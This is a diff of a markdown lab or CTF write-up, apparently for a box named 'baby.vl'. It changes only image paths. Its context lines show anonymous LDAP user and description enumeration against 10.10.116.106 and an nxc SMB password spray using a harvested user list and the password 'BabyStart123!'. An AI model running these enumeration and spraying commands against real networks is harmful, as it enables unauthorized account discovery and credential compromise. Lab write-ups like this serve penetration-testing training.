@@ -83,22 +83,21 @@ ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
 ```bash
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
 ```
-![alt text](assets/image1.png)
+![alt text](/assets/screenshots/image1.png)
 
 Descriptions
 
 ```bash
 ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
 ```
-![alt text](assets/image2.png)
+![alt text](/assets/screenshots/image2.png)
 
 ### SMB
 
 ```bash
 nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
 ```
-
-![image](https://www.notion.so/image/attachment%3A8128a076-a6bb-4f80-9bb2-dc3ad0369069%3Aimage?table=block&id=1d43d2c4-89f6-80df-96ae-c13d0b80c19d&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)
+![alt text](/assets/screenshots/image3.png)
 
 Password Change
 
